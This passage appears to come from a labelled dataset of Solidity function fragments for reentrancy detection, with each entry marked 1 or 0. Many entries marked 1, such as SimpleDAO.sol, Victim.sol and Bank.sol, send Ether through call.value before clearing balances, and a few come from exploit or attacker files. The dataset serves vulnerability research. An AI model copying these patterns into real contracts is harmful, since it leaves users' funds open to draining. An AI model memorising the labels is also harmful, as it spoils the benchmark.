step2(amount / 2);
1
---------------------------------
1859 22805.sol
22805.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
1860 Reentrance_exploit.sol
Reentrance_exploit.sol
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
1861 14353.sol
14353.sol
function buy(){
require(sale != 0x0);
require(sale.call.value(this.balance)());
1
---------------------------------
1862 2301.sol
2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
1863 33851.sol
33851.sol
function donate( bytes32 hash) payable {
print(hash);
if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw;
uint256 tokens = (msg.value * price());
balances[msg.sender] = (balances[msg.sender] + tokens);
totalSupply = (totalSupply + tokens);
saleEtherRaised = (saleEtherRaised + msg.value);
if (!founder.call.value(msg.value)()) throw;
Donate(msg.value, tokens);
0
---------------------------------
1864 36732.sol
36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
1865 27159.sol
27159.sol
function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1866 27398.sol
27398.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1867 15458.sol
15458.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public  returns (bool success)  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer( address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
if (isContract(rx)) {
rx.tokenFallback( msg.sender, value, data );
return true;
return false;
1
---------------------------------
1868 35617.sol
35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1869 19128.sol
19128.sol
function doWithdraw(address from, address to, uint256 amount) internal {
require(amount <= MAX_WITHDRAWAL);
require(balances[from] >= amount);
require(withdrawalCount[from] < 3);
balances[from] = balances[from].sub(amount);
to.call.value(amount)();
withdrawalCount[from] = withdrawalCount[from].add(1);
function withdraw(uint256 amount) public {
doWithdraw(msg.sender, msg.sender, amount);
function withdrawTo(address to, uint256 amount) public {
doWithdraw(msg.sender, to, amount);
function withdrawFor(address from, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, msg.sender, amount);
function withdrawForTo(address from, address to, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, to, amount);
1
---------------------------------
1870 Victim.sol
Victim.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
1
---------------------------------
1871 25808.sol
25808.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
1872 21111.sol
21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1873 33501.sol
33501.sol
function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1874 Reentrance_01.sol
Reentrance_01.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){
throw;
userBalance[msg.sender] = 0;
1
---------------------------------
1875 1751.sol
1751.sol
function proxy(address target, bytes data) public payable {
target.call.value(msg.value)(data);
contract VaultProxy is Proxy {
address public Owner;
mapping (address => uint256) public Deposits;
1
---------------------------------
1876 14579.sol
14579.sol
function pay() public onlyOwner whenNotCanceled {
require(weiCollected > 0);
uint256 fee;
uint256 netAmount;
(fee, netAmount) = _getFeeAndNetAmount(weiCollected);
require(address(sale).call.value(netAmount)(this));
tokensReceived = getToken().balanceOf(this);
if (fee != 0) {
manager.transfer(fee);
paid = true;
emit Paid(netAmount, fee);
0
---------------------------------
1877 37836.sol
37836.sol
function collect() onlyOwner {
require(addrcnt.call.value(this.balance)(0));
Collect(addrcnt,this.balance);
0
---------------------------------
1878 774.sol
774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1879 Reentrance_03.sol
Reentrance_03.sol
function withdrawBalance_fixed(){
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
0
---------------------------------
1880 7530.sol
7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1881 36645.sol
36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
1882 39749.sol
39749.sol
function calcRefund(address _addressToRefund) internal {
uint amount = balanceOf[_addressToRefund];
balanceOf[_addressToRefund] = 0;
if (amount > 0) {
if (_addressToRefund.call.value(amount)()) {
LogFundTransfer(_addressToRefund, amount, false);
} else {
balanceOf[_addressToRefund] = amount;
function safeWithdraw() public onlyAfterDeadline {
if (amountRaised >= fundingGoal){
fundingGoalReached = true;
LogGoalReached(bankRollBeneficiary, amountRaised);
crowdsaleClosed = true;
if (!fundingGoalReached) {
calcRefund(msg.sender);
if (msg.sender == owner && fundingGoalReached) {
bankrollBeneficiaryAmount = (this.balance*80)/100;
if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) {
LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false);
etherollBeneficiaryAmount = this.balance;
if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw;
LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false);
} else {
fundingGoalReached = false;
function emergencyWithdraw() public isEmergency {
calcRefund(msg.sender);
0
---------------------------------
1883 36334.sol
36334.sol
function buy_the_tokens() {
require(msg.sender == owner);
require(!bought_tokens);
require(sale != 0x0);
require(this.balance >= min_required_amount);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
0
---------------------------------
1884 28687.sol
28687.sol
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1885 1430.sol
1430.sol
function callContract(address to, bytes data) onlyOwner public payable returns (bool) {
require(to.call.value(msg.value)(data));
return true;
0
---------------------------------
1886 23088.sol
23088.sol
function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{
require(addrs.length == values.length && addrs.length == calldataLengths.length);
uint j = 0;
for (uint i = 0; i < addrs.length; i++) {
bytes memory calldata = new bytes(calldataLengths[i]);
for (uint k = 0; k < calldataLengths[i]; k++) {
calldata[k] = calldatas[j];
j++;
require(addrs[i].call.value(values[i])(calldata));
1
---------------------------------
1887 Reentrance_02.sol
Reentrance_02.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
function() public payable {}
1
---------------------------------
1888 26523.sol
26523.sol
function claim_reward(uint uid, bytes32 passcode) public payable{
require(msg.value >= parameters["price"]);
require(is_passcode_correct(uid, passcode));
uint final_reward = get_reward(uid) + msg.value;
if (final_reward > parameters["price_poοl"])
final_reward = parameters["price_poοl"];
require(msg.sender.call.value(final_reward)());
parameters["price_poοl"] -= final_reward;
if (uid + 1 < users.length)
users[uid] = users[users.length - 1];
users.length -= 1;
1
---------------------------------
1889 SimpleDAO.sol
SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
1
---------------------------------
1890 21241.sol
21241.sol
function finish() onlyOwner saleCompletedSuccessfully public {
uint256 freeEthers = address(this).balance * 40 / 100;
uint256 vestedEthers = address(this).balance - freeEthers;
address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers);
assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)());
AuctusToken token = AuctusToken(auctusTokenAddress);
token.setTokenSaleFinished();
if (remainingTokens > 0) {
token.burn(remainingTokens);
remainingTokens = 0;
0
---------------------------------
1891 39817.sol
39817.sol
function callDividend(address token_) owned {
assert(tokenManage[token_].hasDividend);
assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData));
function buyEther(uint256 amount) {
assert(valueToToken(etherContract,balances[msg.sender]) >= amount);
assert(destroyValue(msg.sender, tokenToValue(etherContract,amount)));
assert(msg.sender.call.value(amount)());
Buy(etherContract, msg.sender, amount, balances[msg.sender]);
function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock {
uint256 inValue;
uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value),
tokenToValue(tokenFrom,input));
inValue = valueWithFee(tempInValue);
uint256 outValue = valueToToken(tokenTo,inValue);
assert(verifiedTransferFrom(tokenFrom,msg.sender,input));
if (tokenTo == etherContract){
assert(msg.sender.call.value(outValue)());
} else assert(Token(tokenTo).transfer(msg.sender, outValue));
Trade(tokenFrom, tokenTo, msg.sender, inValue);
function takeEtherProfits(){
ShopKeeper(shopKeeperLocation).splitProfits();
ValueTrader shop = ValueTrader(shopLocation);
shop.buyEther(shop.balanceOf(this));
assert(profitContainerLocation.call.value(this.balance)());
0
---------------------------------
1892 9920.sol
9920.sol
function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){
return target.call.value(value)(calldata);
function exec(address target, bytes calldata, uint value) internal {
if(!tryExec(target, calldata, value)) {
throw;
function tryExec( address t, bytes c ) internal returns (bool) {
return tryExec(t, c, 0);
function tryExec( address t, uint256 v ) internal returns (bool) {
bytes memory c; return tryExec(t, c, v);
contract DSMath {
0
---------------------------------
1893 32605.sol
32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(
address indexed identity,
address indexed creator,
address owner,
address indexed recoveryKey);
event LogOwnerAdded(
address indexed identity,
address indexed owner,
address instigator);
event LogOwnerRemoved(
address indexed identity,
address indexed owner,
address instigator);
event LogRecoveryChanged(
address indexed identity,
address indexed recoveryKey,
address instigator);
event LogMigrationInitiated(
address indexed identity,
address indexed newIdManager,
address instigator);
event LogMigrationCanceled(
address indexed identity,
address indexed newIdManager,
address instigator);
event LogMigrationFinalized(
address indexed identity,
address indexed newIdManager,
address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
_;
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
_;
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
_;
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
_;
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
_;
modifier validAddress(address addr) {
require(addr != address(0));
_;
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
1894 22416.sol
22416.sol
function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
if(Holders[_addr]>0)  {
if(_addr.call.value(_wei)()){
Holders[_addr]-=_wei;
0
---------------------------------
1895 40090.sol
40090.sol
function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) {
return _to.call.value(_value)(_data);
function() returns(bool) {
return multiAccessCall(multiAccessRecipient, msg.value, msg.data);
function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) {
return this.multiAccessCallD(_to, _value, _data, msg.sender);
0
---------------------------------
1896 Bank.sol
Bank.sol
function withdraw(){
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
1
---------------------------------
1897 dumbDAO.sol
dumbDAO.sol
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
1
---------------------------------
1898 8342.sol
8342.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
0
---------------------------------
1899 31912.sol
31912.sol
function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1900 17043.sol
17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
1901 18170.sol
18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
1902 40469.sol
40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
1903 33450.sol
33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
1904 14945.sol
14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
1905 4591.sol
4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
1906 40092.sol
40092.sol
function withdrawPayments() external  returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
1907 simple_dao.sol
simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
1908 1403.sol
1403.sol
function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer( msg.sender, to, value, empty );
return true;
function transferFrom( address from, address to, uint256 value ) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer(msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1909 21900.sol
21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
1910 17518.sol
17518.sol
function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1911 32559.sol
32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1912 40118.sol
40118.sol
function withdrawEtherOrThrow(uint256 amount) private {
if (msg.sender != owner) throw;
bool result = owner.call.value(amount)();
if (!result) { throw;}
function refund() noEther onlyOwner {
if (tokenBalance == 0) throw;
tokenBalance = 0;
withdrawEtherOrThrow(tokenBalance * tokenPrice);
0
---------------------------------
1913 cross-function-reentrancy.sol
cross-function-reentrancy.sol
function WithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
require(recipient.call.value(amountToWithdraw)());
function GetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {
throw;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
claimedBonus[recipient] = true;
1
---------------------------------
1914 25196.sol
25196.sol
function getTokens(uint num, address tokenBuyerContract) public {
tokenBuyerContract.call.value(0 wei)();
1
---------------------------------
1915 27024.sol
27024.sol
function participate() payable onlyHuman {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1916 simple_dao_fixed.sol
simple_dao_fixed.sol
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
0
---------------------------------
1917 35421.sol
35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
_;
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) 	internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}  else {
0
---------------------------------
1918 347.sol
347.sol
function _forwardFunds() internal {
bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();
emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone);
0
---------------------------------
1919 3985.sol
3985.sol
function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable {
require(this == target);
bytes memory prefix = "\x19Ethereum Signed Message:\n32";
bytes32 hash = keccak256(prefix, keccak256(target, data, nonce));
msgSender = ECRecovery.recover(hash, sig);
require(msgSender == sender);
require(nonces[msgSender]++ == nonce);
require(target.call.value(msg.value)(data));
msgSender = address(0);
0
---------------------------------
1920 39019.sol
39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
1921 35637.sol
35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
